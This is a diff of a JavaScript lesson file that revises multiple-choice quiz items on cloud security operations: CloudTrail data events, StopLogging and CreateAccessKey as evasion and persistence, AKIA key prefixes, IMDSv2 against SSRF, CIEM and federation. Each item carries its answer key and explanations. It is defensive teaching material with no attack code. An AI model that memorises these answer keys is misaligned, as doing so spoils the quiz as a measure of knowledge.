+        "explanation": "Least privilege means granting only the specific actions on the specific resources a principal needs, here s3:GetObject (and perhaps s3:ListBucket) on one bucket. An attacker who abuses this role inherits exactly what the policy grants, so the wildcard turns a stolen credential into account-wide S3 access. \"A role's temporary credentials expire on their own\" is wrong: short-lived credentials shorten how long a stolen key works, but while it works it can still do everything the policy allows. \"Replace the role with an IAM user and a long-lived access key\" is wrong: that adds a static secret that can leak and does nothing about the over-broad permissions. \"Tighten the instance's security group\" is wrong: security groups filter network traffic to the instance; they do not limit which S3 API actions the role is allowed to call."
       },
       {
-        "question": "An S3 bucket's access policy was changed to allow public read access. CloudTrail's default management-event trail recorded the PutBucketPolicy call, but the security team also wants to know whether anyone actually downloaded files from the bucket while it was public. What must be true to answer that second question?",
+        "question": "An S3 bucket's access policy was changed to allow public read access. CloudTrail's default management-event trail recorded the PutBucketPolicy call, but the team also wants to know whether anyone actually downloaded files while the bucket was public. What must be true to answer that second question?",
         "options": [
           {
-            "label": "Nothing extra is needed — CloudTrail management events already record every individual file download from the bucket by default.",
+            "label": "Nothing extra: the default management events already record each file download from the bucket.",
             "value": "a"
           },
           {
-            "label": "CloudTrail data events for S3 must be explicitly enabled, since object-level reads are data-plane activity not captured by the default management trail.",
+            "label": "CloudTrail data events for S3 must be enabled, since object reads are data-plane activity.",
             "value": "b"
           },
           {
-            "label": "The question cannot be answered in AWS under any configuration, because S3 never logs which specific files were downloaded.",
+            "label": "VPC flow logs must be reviewed, since they record each object an outside IP downloaded.",
             "value": "c"
           },
           {
-            "label": "Only the bucket's IAM policy document itself needs to be reviewed, since policies list every past access to the bucket's objects.",
+            "label": "The bucket policy must be reviewed, since it records which principals read objects under it.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "PutBucketPolicy is a control-plane (management) event, logged by default. Whether files were actually read is data-plane activity, which requires explicitly enabling CloudTrail data events for S3 (or equivalent access logging) — it is not captured by default. The claim that nothing extra is needed is false; management events do not include object-level reads. The claim that it cannot be answered in AWS is wrong because data events exist precisely to answer this. Reviewing only the bucket's IAM policy confuses a policy document (what is allowed) with an access log (what actually happened)."
+        "explanation": "PutBucketPolicy is a control-plane (management) event, logged by default. Reading objects (GetObject) is data-plane activity, which CloudTrail records only if data events for S3 were explicitly enabled. \"The default management events already record each file download\" is wrong: object-level reads are exactly what the default trail leaves out. \"VPC flow logs must be reviewed\" is wrong: flow logs record connections between IPs and ports, not which objects in a bucket were read. \"The bucket policy must be reviewed\" is wrong: a policy states what is allowed, not what actually happened; only an access log shows real reads."
       },
       {
-        "question": "A security tool in your environment raises a finding that an IAM role has far more permissions attached than it has ever actually used, creating unnecessary blast radius if the role is ever compromised. Which cloud security tooling category most directly describes this kind of finding?",
+        "question": "A security tool raises a finding that an IAM role has far more permissions attached than it has ever actually used, creating unnecessary blast radius if the role is compromised. Which tooling category most directly produces this kind of finding?",
         "options": [
           {
-            "label": "CWPP, because the finding concerns a specific vulnerable package installed inside a running workload.",
+            "label": "CWPP, because the over-permissioned role is attached to a running workload that could be compromised.",
             "value": "a"
           },
           {
-            "label": "CIEM, because it analyses identity permissions to surface excess or unused entitlements, distinct from a workload or a plain configuration setting.",
+            "label": "CIEM, because it analyses identity permissions to find entitlements that are excessive or never used.",
             "value": "b"
           },
           {
-            "label": "Well-Architected Framework tooling, because it only ever measures cost efficiency rather than security risk.",
+            "label": "CSPM, because a too-broad IAM policy is a configuration setting that posture scanning checks for.",
             "value": "c"
           },
           {
-            "label": "Physical security tooling, because permission sprawl is ultimately a hardware access-control problem.",
+            "label": "CNAPP, because the finding comes from a platform that combines posture, workload and identity checks.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Cloud Infrastructure Entitlement Management (CIEM), typically consolidated inside a CNAPP alongside CSPM and CWPP, analyses IAM policies to find excess or unused permissions — exactly the finding described. The vulnerable-package option describes CWPP (workload vulnerabilities), not identity entitlements. The Well-Architected option mischaracterises the Well-Architected Framework, which covers far more than cost and is guidance, not a scanning tool. The physical security option is unrelated; this is an identity/permissions issue, not physical access control."
+        "explanation": "CIEM (Cloud Infrastructure Entitlement Management) analyses IAM policies to find excess or unused permissions. The clue \"has ever actually used\" means the tool compared granted permissions with real usage, which is CIEM's speciality. \"CWPP\" is wrong: CWPP looks inside the workload for vulnerabilities, malware and risky processes, not at what an identity is entitled to do. \"CSPM\" is the close miss: posture tools do flag obviously broad policies as a setting, but deciding which permissions are unused needs entitlement analysis. \"CNAPP\" is wrong as the most direct answer: CNAPP is the umbrella platform that contains CIEM, CSPM and CWPP, not the category that produces this specific finding."
       },
       {
-        "question": "In CloudTrail you see a StopLogging event, followed minutes later by CreateAccessKey creating a key for a different user than the caller. Why is this pairing so alarming?",
+        "question": "In CloudTrail you see a StopLogging event, followed minutes later by CreateAccessKey creating a key for a different user than the caller. Neither call came through the change pipeline. What is the most likely reading of this pair?",
         "options": [
           {
-            "label": "StopLogging disables the audit trail that would record further actions, and CreateAccessKey for another user plants a long-lived backdoor credential, so together they show an attacker blinding the defenders and establishing persistence.",
+            "label": "Defence evasion and persistence: the audit trail is switched off, then a lasting key is minted for another identity.",
             "value": "a"
           },
           {
-            "label": "Both are routine maintenance calls that AWS runs automatically every night, so seeing them together simply confirms the account is healthy and fully logged.",
+            "label": "Routine maintenance: the trail is being moved to a new bucket, and that user's old access key is being rotated.",
             "value": "b"
           },
           {
-            "label": "StopLogging encrypts the CloudTrail bucket for compliance, and CreateAccessKey rotates expired keys, so the pair indicates a successful security hardening job.",
+            "label": "Reconnaissance only: both are read-only calls that list the account's settings without changing anything.",
             "value": "c"
           },
           {
-            "label": "They are Azure Activity Log operations that have no meaning in AWS, so the alert is a false positive from a mismatched log source.",
+            "label": "Privilege escalation: a policy granting broader permissions was attached to the caller's own identity.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "StopLogging turns off CloudTrail, removing the record of subsequent actions (MITRE Impair Defenses, T1562), and CreateAccessKey for a different user plants a durable backdoor key (persistence). Together they are evasion plus persistence, a hallmark attacker sequence. They are not routine automation, StopLogging does not encrypt anything, and both are genuine AWS CloudTrail event names."
+        "explanation": "StopLogging turns off the CloudTrail trail that would record later actions (MITRE Impair Defenses, T1562), and CreateAccessKey for a user other than the caller is the classic cloud backdoor: a new long-lived key that survives rotation of the original credential. Together they are evasion plus persistence. \"Routine maintenance\" is wrong: outside a documented change, StopLogging is almost never legitimate, and a key minted for someone else is not the same as that user rotating their own key. \"Reconnaissance only\" is wrong: both calls change the account; read-only calls look like Describe*, List* or Get*. \"Privilege escalation\" is wrong: attaching a policy appears as AttachUserPolicy or PutUserPolicy, and neither call here grants new permissions."
       },
       {
-        "question": "You need to place an alert that mentions reading a stored database password. Using the category-first approach, which service is involved in each cloud?",
+        "question": "An alert says a stored database password was read. Using the category-first approach, which service category is involved, and what is it called in each cloud?",
         "options": [
           {
-            "label": "The secret store: AWS Secrets Manager (GetSecretValue), Azure Key Vault (secret get), and GCP Secret Manager each hold credentials, and reading from them is the action to investigate.",
+            "label": "The secret store: AWS Secrets Manager (GetSecretValue), Azure Key Vault secrets, and GCP Secret Manager.",
             "value": "a"
           },
           {
-            "label": "The object store: AWS S3, Azure Blob Storage, and GCP Cloud Storage are where all passwords are always kept by design, so the alert must involve those services.",
+            "label": "Key management: AWS KMS, Azure Key Vault keys, and GCP Cloud KMS, which hold the encryption keys.",
             "value": "b"
           },
           {
-            "label": "The virtual-machine service: AWS EC2, Azure Virtual Machines, and GCP Compute Engine are the only places a secret can be read.",
+            "label": "The audit log: AWS CloudTrail, Azure Activity Log, and GCP Cloud Audit Logs, which recorded the read.",
             "value": "c"
           },
           {
-            "label": "The audit log itself: AWS CloudTrail, Azure Activity Log, and GCP Cloud Audit Logs store secrets and hand them out on request.",
+            "label": "The managed database: AWS RDS, Azure SQL Database, and GCP Cloud SQL, which the password unlocks.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Each cloud has one dedicated secret store: AWS Secrets Manager (read via GetSecretValue), Azure Key Vault (secret get), and GCP Secret Manager. Reading a stored password maps to that category. Object stores hold files not managed secrets, VM services run compute, and audit logs record actions rather than vaulting secrets."
+        "explanation": "Stored credentials live in each cloud's secret store: AWS Secrets Manager (read with GetSecretValue), Azure Key Vault secrets, and GCP Secret Manager, so that is where the read happened. \"Key management\" is the near miss: KMS and Key Vault keys manage encryption keys, a separate category from stored secrets such as passwords. \"The audit log\" is wrong: the audit log recorded the read, but it is not the service that held the password. \"The managed database\" is wrong: the password may be for a database, but the alert is about reading it from where it was stored, not about logging in to the database."
       }
     ],
     "references": [
@@ -5205,142 +5205,142 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "A developer accidentally commits an AWS access key (an AKIA key ID plus its secret) to a public GitHub repository. Within minutes, the key is used from an unfamiliar foreign IP to list IAM users and create a new access key. Why did MFA on the developer's console login fail to prevent this?",
+        "question": "A developer accidentally commits an AWS access key (an AKIA key ID plus its secret) to a public GitHub repository. Within minutes, the key is used from an unfamiliar foreign IP to list IAM users and create a new access key. The developer has MFA enabled on their console login. Why did that MFA not stop this?",
         "options": [
           {
-            "label": "MFA failed only because the developer had disabled it that morning; with MFA enabled, the leaked access key would have required a second factor to work.",
+            "label": "MFA was enforced on the root account but not on this IAM user, so its key had no second factor",
             "value": "a"
           },
           {
-            "label": "MFA protects interactive human sign-ins, but a programmatic access key authenticates on its own with no MFA prompt, so the key itself was enough for the attacker.",
+            "label": "Console MFA protects interactive sign-ins; an access key authenticates on its own, so no MFA prompt ever appears",
             "value": "b"
           },
           {
-            "label": "MFA would have blocked the attack, but GitHub stripped the MFA requirement from the key when the repository was made public to the internet.",
+            "label": "The attacker replayed the developer's post-MFA console session token (AiTM), so the MFA check was already satisfied",
             "value": "c"
           },
           {
-            "label": "MFA did prevent the attack; the observed activity must be the developer themselves, because a leaked key can never be used without the account password.",
+            "label": "The attacker caused MFA fatigue until the developer approved a prompt, which then authorised the key's API calls",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "MFA secures interactive sign-ins, but an access key is a machine credential that authenticates without any MFA prompt — the key is itself the proof of identity — so a leaked key works for a thief exactly as it did for the owner. The 'developer disabled MFA' option is wrong because MFA on the console does not gate programmatic key use regardless of whether it was enabled. The GitHub-stripped-MFA option invents GitHub behaviour that does not exist. The claim that MFA did prevent the attack wrongly assumes a key needs the password, which it does not."
+        "explanation": "MFA protects interactive sign-ins, but an access key is a machine credential that authenticates by itself: the key is the proof of identity, so a leaked key works for a thief exactly as it did for the owner, with no prompt at any point. The 'root account but not this IAM user' option implies MFA on the IAM user's console login would have helped, but console MFA never gates programmatic key use. The AiTM option describes a real technique, but the evidence here is the committed key itself being used, not a stolen browser session. The MFA-fatigue option is also a real technique, but access-key API calls generate no MFA prompts to bomb, which is why the case study timeline shows none."
       },
       {
         "question": "Your organisation wants to reduce the risk that a compromised credential gives an attacker durable, wide-ranging cloud access. Which approach most directly addresses the core weakness of long-lived access keys?",
         "options": [
           {
-            "label": "Print all access keys to a secured document each month so administrators can review which ones exist and confirm they are still needed.",
+            "label": "Rotate every access key every 90 days, so each long-lived key stays valid for a limited period",
             "value": "a"
           },
           {
-            "label": "Give every workload broad wildcard permissions so fewer distinct keys are required and the overall configuration stays simpler to manage.",
+            "label": "Enforce MFA on all human console logins, so a stolen password by itself cannot complete a sign-in",
             "value": "b"
           },
           {
-            "label": "Replace long-lived keys with roles and temporary, auto-expiring credentials (managed identities) wherever possible, and tightly scope any keys that remain.",
+            "label": "Replace keys with roles and auto-expiring credentials, and tightly scope any keys that must remain",
             "value": "c"
           },
           {
-            "label": "Disable MFA on human accounts so that authentication is consistent between people and machine identities across the whole environment.",
+            "label": "Move every access key out of source code and into environment variables on each server that uses it",
             "value": "d"
           }
         ],
         "answer": "c",
-        "explanation": "The core weakness of a long-lived key is that it works indefinitely from anywhere once stolen; replacing it with roles and temporary, auto-expiring credentials shrinks the window of usefulness, and least-privilege scoping limits the damage of any key that must remain. Printing the keys for monthly review does nothing to reduce the keys' danger. Granting broad wildcard permissions increases risk by widening permissions. Disabling MFA on human accounts weakens security by removing MFA, making human credential theft easier."
+        "explanation": "The core weakness of a long-lived key is that, once stolen, it works from anywhere until someone revokes it. Roles and temporary, auto-expiring credentials remove the static key altogether (nothing to commit or paste), and least-privilege scoping limits the damage of any key that must remain. The 90-day rotation option is a real hygiene step, but a stolen key still works for the rest of its rotation period; in the case study the key was abused within minutes. The console-MFA option protects human sign-ins only and does not gate programmatic keys. The environment-variable option moves where the static secret lives, but it is still long-lived and can still leak from laptops, images or logs."
       },
       {
-        "question": "A company's engineers never set individual AWS passwords — they sign into a corporate SSO portal each morning and are granted temporary access to their AWS accounts automatically. What mechanism makes this possible, and what should the SOC watch as a result?",
+        "question": "A company's engineers never set individual AWS passwords. They sign into a corporate SSO portal each morning and are granted temporary access to their AWS accounts automatically. What mechanism makes this possible, and what should the SOC watch as a result?",
         "options": [
           {
-            "label": "AWS silently disables all authentication requirements for accounts under 90 days old, so no login of any kind is actually being checked here.",
+            "label": "The portal copies each engineer's long-term AKIA access key into their CLI every morning; watch for AKIA use",
             "value": "a"
           },
           {
-            "label": "Federation lets AWS trust the company's identity provider directly, granting temporary role credentials on sign-in, so the SOC must watch the IdP's sign-in logs too.",
+            "label": "Federation: AWS trusts the company IdP and issues temporary role credentials; watch the IdP's sign-in logs",
             "value": "b"
           },
           {
-            "label": "Every engineer is issued the same shared root access key each morning by an administrator, who emails it out for manual entry into the CLI.",
+            "label": "AWS keeps a synced copy of each corporate password and checks it itself; watch CloudTrail console logins",
             "value": "c"
           },
           {
-            "label": "AWS permanently remembers each laptop's network address after the first login, so no further authentication step of any kind ever occurs again.",
+            "label": "Each engineer has an IAM user password plus MFA that the portal enters; watch the IAM users' MFA events",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Federation lets AWS trust a company's identity provider via SAML or OIDC, so a single SSO sign-in issues temporary role credentials (e.g., via AssumeRoleWithSAML) without ever creating an AWS-specific password. Because the IdP is the real front door, its sign-in and MFA logs deserve as much SOC attention as CloudTrail. The 'accounts under 90 days old' option invents a fake age-based exemption. The shared root access key option describes an insecure shared-secret practice, not federation. The 'remembers each laptop's address' option fabricates permanent device trust that does not exist."
+        "explanation": "With federation, identity lives in one place, the corporate identity provider, and AWS trusts it via SAML or OIDC: one SSO sign-in yields temporary role credentials (for example through AssumeRoleWithSAML in IAM Identity Center) without any AWS password. Because the IdP is the real front door, its sign-in and MFA logs deserve as much SOC attention as CloudTrail. The AKIA option contradicts the stem: the access is temporary, while AKIA keys are long-lived. The password-sync option misdescribes federation, whose point is that AWS does not keep its own password for the user. The IAM-user option contradicts 'never set individual AWS passwords' and reintroduces the per-cloud passwords that federation is meant to remove."
       },
       {
-        "question": "An internet-facing web application running on an EC2 instance has a Server-Side Request Forgery (SSRF) flaw that lets an attacker force it to issue an HTTP GET request to a URL of the attacker's choosing. The instance has IMDSv2 enforced (http_tokens: required). Why does this configuration most directly limit the attacker's ability to steal the attached role's credentials via this SSRF flaw?",
+        "question": "An internet-facing web application on an EC2 instance has a Server-Side Request Forgery (SSRF) flaw that lets an attacker make it issue an HTTP GET to a URL of their choosing. The instance enforces IMDSv2 (http_tokens: required). Why does this most directly limit theft of the attached role's credentials through this flaw?",
         "options": [
           {
-            "label": "IMDSv2 disables the Instance Metadata Service entirely, so no credentials of any kind exist on the instance to steal.",
+            "label": "IMDSv2 blocks every HTTP request to 169.254.169.254 from the instance, so the role's credentials can no longer be fetched",
             "value": "a"
           },
           {
-            "label": "IMDSv2 requires a prior PUT request that returns a session token which must be sent in a custom header on the GET request, a two-step, header-bearing exchange a typical GET-only SSRF cannot perform.",
+            "label": "IMDSv2 needs a PUT that returns a token, which must come back in a custom header on the GET — steps a GET-only SSRF can't do",
             "value": "b"
           },
           {
-            "label": "IMDSv2 encrypts the credentials with the instance's own SSH key, so only someone with prior shell access could ever decrypt them.",
+            "label": "IMDSv2 rotates the role's credentials much faster, so anything stolen through the SSRF expires before it can be used",
             "value": "c"
           },
           {
-            "label": "IMDSv2 moves the metadata endpoint to a random IP address each hour, making it impossible for any script to locate reliably.",
+            "label": "IMDSv2 sets the hop limit to 1, so a request relayed through the web application is dropped as an extra network hop",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "IMDSv2 requires first issuing a PUT to obtain a session token, then including that token in a custom header on the follow-up GET. Most SSRF vulnerabilities only let an attacker cause a GET to an attacker-chosen URL and cannot add custom headers or issue a PUT, which breaks the classic Capital-One-style exploitation path. The claim that IMDSv2 disables IMDS entirely is false; IMDS still serves credentials, just with the token requirement. The SSH-key encryption option invents an encryption mechanism that does not exist. The random-IP option fabricates address randomisation; the endpoint remains 169.254.169.254."
+        "explanation": "IMDSv2 requires a PUT to obtain a session token, then that token in a custom header on the follow-up GET. Most SSRF flaws only let an attacker trigger a GET to a chosen URL, without adding headers or issuing a PUT, which breaks the Capital-One-style path. The 'blocks every request' option is false: IMDS still serves credentials to callers that present the token, which is how legitimate code on the instance gets them. The faster-rotation option is false: IMDSv2 changes how the request must be made, not how long the credentials last. The hop-limit option names a separate setting (http_put_response_hop_limit) that targets relays through an extra hop such as a container; it is not what http_tokens: required enforces, and an application on the instance itself is not an extra hop."
       },
       {
-        "question": "An access key beginning with the prefix AKIA appears in an alert, used from an IP address the owning identity has never logged in from. Why does the AKIA prefix specifically raise the stakes?",
+        "question": "An access key ID beginning with AKIA appears in an alert, used from an IP address the owning identity has never used before. What does the AKIA prefix tell you, and why does it raise the stakes?",
         "options": [
           {
-            "label": "AKIA marks a long-lived static access key that works indefinitely and from anywhere until manually revoked, so a stolen one grants lasting access with no automatic expiry to save you, unlike a temporary ASIA credential.",
+            "label": "A long-term access key that works from anywhere until revoked, so a stolen one never expires by itself",
             "value": "a"
           },
           {
-            "label": "AKIA marks a temporary STS credential that expires within an hour, so the alert is automatically low priority and can be closed without review.",
+            "label": "A temporary STS session key, so the attacker's access ends by itself once the session expires in hours",
             "value": "b"
           },
           {
-            "label": "AKIA is the prefix of an Amazon Resource Name, meaning the string is only an address and cannot be used to authenticate at all.",
+            "label": "A role ID, so the alert is about a role being assumed rather than a reusable key that could be stolen",
             "value": "c"
           },
           {
-            "label": "AKIA indicates a managed identity, which never stores a secret, so a leak is impossible by design.",
+            "label": "An IAM user's unique ID, which names the user in logs but cannot by itself be used to sign API requests",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "The AKIA prefix denotes a long-term access key for an IAM user or root: it is static and works from anywhere until someone revokes it, so a stolen AKIA key gives durable access with no self-expiry. That is exactly why AKIA use from a new location is high priority. ASIA is the temporary/expiring prefix, an ARN is an address not this key, and managed identities are the no-stored-secret Azure pattern."
+        "explanation": "AKIA denotes a long-term access key for an IAM user or root: it is static and works from anywhere until someone revokes it, so a stolen AKIA key gives durable access with no self-expiry, which is why first use from a new location is high priority. The temporary-session option describes ASIA, the STS prefix. The role-ID option describes AROA, which names the role identity behind an AssumeRole. The unique-ID option describes AIDA, the IAM user's identifier. Reading the first four letters correctly is what tells you whether the credential can expire on its own."
       },
       {
         "question": "A developer needs an application running on an Azure VM to read from Blob Storage, and asks which credential to use. Which option best follows the security ranking taught in this lesson?",
         "options": [
           {
-            "label": "A managed identity, because Azure issues and rotates the token automatically with no secret stored on the VM, removing the credential that could leak.",
+            "label": "A managed identity, because Azure issues and rotates its token and no secret is ever stored on the VM",
             "value": "a"
           },
           {
-            "label": "A service principal with a long-lived client secret pasted into the application's config file, because a static secret is simplest to reuse across every machine.",
+            "label": "A service principal with a client secret in an environment variable on the VM, rotated every 90 days",
             "value": "b"
           },
           {
-            "label": "A permanent SAS token with a ten-year expiry embedded in the blob URL and shared in the team chat for convenience.",
+            "label": "A service principal with a certificate kept in Key Vault, which the app retrieves when it starts up",
             "value": "c"
           },
           {
-            "label": "An AWS AKIA access key copied into an environment variable, because long-lived keys are the recommended cross-cloud standard.",
+            "label": "A SAS token with a 30-day expiry, embedded in the app's config and regenerated every month by the team",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "A managed identity is the recommended pattern: Azure issues and rotates the token, nothing is stored on the VM, so there is no secret to leak. A pasted long-lived client secret and a ten-year SAS URL in chat are exactly the static-credential leaks the lesson warns against, and an AWS AKIA key is both the wrong cloud and the highest-risk long-lived credential type."
+        "explanation": "A managed identity sits at the safe end of the lesson's ranking: Azure issues and rotates the token automatically and nothing is stored on the VM, so there is no secret to leak. The client-secret option is the long-lived Azure credential the lesson warns about; 90-day rotation still leaves a static secret on the box for months. The Key Vault certificate option improves storage, but a vault is only as safe as the credential used to open it, and the managed identity is what removes that credential entirely. The 30-day SAS option is a time-boxed but still leakable signed URL sitting in a config file, with an expiry far longer than needed."
       }
     ],
     "references": [
@@ -5405,79 +5405,79 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "During an investigation you find a CloudTrail event with eventName 'StopLogging' called by an IAM user shortly after that user was seen enumerating permissions. Why is this StopLogging event so significant, and what is the intended effect for the attacker?",
+        "question": "During an investigation you find a CloudTrail event with eventName 'StopLogging' called by an IAM user shortly after that same user was seen enumerating permissions. Why is this StopLogging event so significant?",
         "options": [
           {
-            "label": "It is insignificant routine maintenance, because CloudTrail must be stopped and restarted daily, so this event can safely be ignored during triage.",
+            "label": "A trail being migrated to an organization trail briefly stops the old trail, so a StopLogging near a migration is routine and low priority.",
             "value": "a"
           },
           {
-            "label": "It shows the attacker disabling CloudTrail to blind the SOC so their later actions leave no management-plane trail; the disabling itself is a top-priority alert.",
+            "label": "Right after enumeration, it is the attacker disabling CloudTrail so later actions leave no management-plane trail — the StopLogging call itself is a top-priority alert.",
             "value": "b"
           },
           {
-            "label": "It means CloudTrail automatically encrypted itself for safety, so all subsequent events are simply stored in a stronger format that analysts cannot read.",
+            "label": "The user is rotating the trail's destination S3 bucket, which requires stopping logging first, so this is an expected administrative step.",
             "value": "c"
           },
           {
-            "label": "It proves the account is fully secure, because only a legitimate administrator performing an approved audit is ever able to call the StopLogging action.",
+            "label": "StopLogging pauses Insights events while regular management events keep recording, so visibility is barely affected and triage can wait.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "StopLogging turns off CloudTrail so the attacker's subsequent management-plane actions leave no trail — a classic Impair Defenses move — and because the disabling action is itself recorded, it should be a top-priority alert. The 'routine maintenance' option invents a daily-restart requirement that does not exist. The 'automatically encrypted itself' option fabricates self-encryption. The 'proves the account is fully secure' option is false: many identities could call StopLogging if over-permissioned, and the context (enumeration first) points to abuse, not a routine audit."
+        "explanation": "Correct: following permission enumeration, StopLogging is the classic Impair Defenses move — the attacker turns the trail off so their next actions (new keys, policy changes, exfiltration) leave no management-plane record, and because disabling logging is itself logged, that call is exactly the rare high-severity event to alert on immediately. The migration option is a plausible-sounding excuse but does not fit an actor who just finished enumerating permissions. The bucket-rotation option invents a workflow: you redirect a trail's destination without a StopLogging call, and the enumeration context makes a benign read unlikely. The Insights-only option is wrong: StopLogging stops the trail's management-event delivery, not merely Insights."
       },
       {
-        "question": "You want to determine exactly which individual objects an attacker read out of an S3 bucket during an incident last week, but you can only find management-plane records of bucket policy changes. What is the most likely reason, and what does it teach about cloud logging?",
+        "question": "Re-read the 14:02–14:06 svc-reporting sequence: ConsoleLogin, then ListUsers and ListAttachedUserPolicies, then CreateAccessKey, then AttachUserPolicy granting AdministratorAccess. Which single event is the Persistence step of that chain?",
         "options": [
           {
-            "label": "Object reads are management-plane events that CloudTrail always captures, so the data must have been deleted by the attacker to hide the reads.",
+            "label": "The AttachUserPolicy call that granted the AdministratorAccess managed policy to the user.",
             "value": "a"
           },
           {
-            "label": "Reading individual objects is data-plane activity, which is high-volume and often must be enabled beforehand, so without it that visibility was never recorded.",
+            "label": "The CreateAccessKey call, which mints a second long-lived credential that survives a password reset.",
             "value": "b"
           },
           {
-            "label": "S3 never logs any access at all, so the only way to know which objects were read is to ask the attacker or reconstruct it from network packets.",
+            "label": "The ListAttachedUserPolicies call that read which policies were already attached to the user.",
             "value": "c"
           },
           {
-            "label": "The management-plane log automatically includes every object read, so the missing records simply mean the incident never actually involved that bucket.",
+            "label": "The ConsoleLogin event that opened the interactive session from the unfamiliar IP.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Reading individual objects is data-plane activity, which is far higher volume than management events and frequently must be explicitly enabled (S3 object-level data events); if it was not turned on before the incident, that visibility does not exist. This teaches that data-plane coverage is a decision to make in advance for sensitive resources. The options blaming deletion or an uninvolved bucket wrongly claim object reads are management-plane events. The claim that S3 never logs access overstates the gap — S3 data events can be logged when enabled."
+        "explanation": "Correct: CreateAccessKey is Persistence — a freshly minted access key is a way back in that outlives a password reset, which is exactly why the lesson maps it to that stage. AttachUserPolicy granting AdministratorAccess is Privilege Escalation, not Persistence — it widens what the identity can do rather than guaranteeing re-entry. ListAttachedUserPolicies is Discovery, the enumeration that precedes the damaging calls. ConsoleLogin from the unfamiliar IP is the Initial Access foothold that opens the chain, not the step that preserves access."
       },
       {
-        "question": "An AWS account only ever relied on CloudTrail's default Event History, and an analyst now needs to alert on suspicious activity going back further than 90 days in a durable, queryable store. What is the gap, and what should have been configured?",
+        "question": "An AWS account only ever relied on CloudTrail's default Event History, and an analyst now needs to alert on activity going back further than 90 days in a durable, queryable store. What is the gap, and what should have been configured?",
         "options": [
           {
-            "label": "There is no gap; Event History automatically retains all events forever once an account is more than 90 days old, so nothing further was needed.",
+            "label": "There is no real gap — Event History can be extended in place from the console to a longer retention range, so nothing further was needed here.",
             "value": "a"
           },
           {
-            "label": "A trail was never created, so events beyond the 90-day Event History were never durably delivered anywhere — a multi-region trail to S3, optionally streamed to CloudWatch, should have been configured.",
+            "label": "No trail was created, so events past the 90-day Event History were not delivered to durable storage; a multi-region trail to S3 (optionally to CloudWatch) should have been configured.",
             "value": "b"
           },
           {
-            "label": "CloudTrail cannot store data longer than 90 days under any configuration, so long-term retention is only possible via third-party packet capture.",
+            "label": "A single-region trail existed, so the gap is just the attacker's activity in an unused region, which widening the trail to multi-region would have caught.",
             "value": "c"
           },
           {
-            "label": "Event History and a trail are the same feature under two names, so creating a trail would not have changed what data was retained or where.",
+            "label": "Event History and a trail store identical data, so the 90-day limit applies to both and long-term retention needs a third-party tool.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Event History is a 90-day, console-only view with no alerting; durable, longer retention and streaming for alerts require a trail delivering log files to S3 (and optionally CloudWatch), ideally multi-region or organization-wide. The 'no gap' option wrongly claims permanent automatic retention. The claim that CloudTrail cannot store data beyond 90 days is false — a trail can retain data indefinitely in S3. The 'same feature under two names' option incorrectly equates two distinct features."
+        "explanation": "Correct: Event History is a rolling 90-day view that is not durable storage; because no trail was ever created, nothing was delivered to a long-term, queryable destination — a multi-region trail writing to S3 (optionally to CloudWatch Logs for alerting) is what closes both the retention and the coverage gap. The in-place-extension option is wrong: Event History's 90 days cannot be lengthened in the console; you create a trail instead. The single-region-trail option contradicts the scenario — the account relied only on Event History, so no trail existed to widen. The identical-data option is wrong: a trail delivers to durable storage well beyond 90 days, which Event History does not."
       },
       {
-        "question": "Your incident response team needs to know exactly which individual objects were read from a sensitive S3 bucket. By default, does a CloudTrail trail record that, and what must have been configured beforehand?",
+        "question": "Your incident response team needs to know exactly which individual objects were read from a sensitive S3 bucket last week. By default, does a CloudTrail trail record that, and what must have been configured beforehand?",
         "options": [
           {
-            "label": "Yes, a trail always records every object read automatically, so the records must exist somewhere and simply need a longer search window to surface them.",
+            "label": "Yes — a trail records object reads automatically, so the records exist and simply need a wider search window to surface.",
             "value": "a"
           },
           {
@@ -5485,39 +5485,39 @@ const NEW_TOPIC_LESSONS = [
             "value": "b"
           },
           {
-            "label": "Yes, because object reads are Insights events, which CloudTrail computes automatically for every bucket the moment any anomaly in call volume is detected.",
+            "label": "Yes — object reads are captured as Insights events, which CloudTrail computes automatically once it detects a call-volume anomaly.",
             "value": "c"
           },
           {
-            "label": "No, because CloudTrail cannot record S3 activity of any kind, so the only possible source for object-level reads is the bucket server access logs feature.",
+            "label": "No — CloudTrail records management actions, so object-level reads are available instead from the S3 server access logs feature.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Reading an individual object is a data-plane operation, recorded as a CloudTrail data event. Data events (like network activity and Insights events) are off by default; only management events are captured automatically. So unless data-event logging was explicitly enabled on that bucket before the incident, the object-level evidence was never created. The 'always records every object read' option wrongly claims automatic capture. The Insights events option misdescribes Insights events, which track call-rate anomalies, not individual reads. The claim that CloudTrail cannot record S3 activity overstates the gap — CloudTrail does log S3 data events when enabled."
+        "explanation": "Correct: an individual object read is a data event, and data events are disabled by default, so unless data-event logging was switched on for that bucket beforehand the evidence was never created. The automatic-trail option is wrong: a default trail captures management events, not object-level reads, so no search window will surface records that were never written. The Insights option misuses Insights, which flags anomalies in the rate/volume of management calls rather than recording object reads. The management-only option is half-right about management scope but wrong to say S3 server access logs are the sole source — CloudTrail data events record object reads too when enabled."
       },
       {
-        "question": "In the Azure Activity Log, which category records resource create/update/delete operations and all Azure RBAC role assignments, making it the primary place an analyst hunts for privilege and configuration changes?",
+        "question": "An Owner role is assigned to a user at 02:00. In the Azure Activity Log, which category would you filter to find that role assignment alongside other privilege and configuration changes?",
         "options": [
           {
-            "label": "The Administrative category — it records resource create, update and delete operations and all Azure RBAC role assignments across the subscription.",
+            "label": "The Administrative category — resource create/update/delete plus Azure RBAC role assignments.",
             "value": "a"
           },
           {
-            "label": "The ServiceHealth category, because it is where Azure records every change a user makes to roles and resources across the subscription.",
+            "label": "The Security category, which carries Microsoft Defender for Cloud alerts and posture findings.",
             "value": "b"
           },
           {
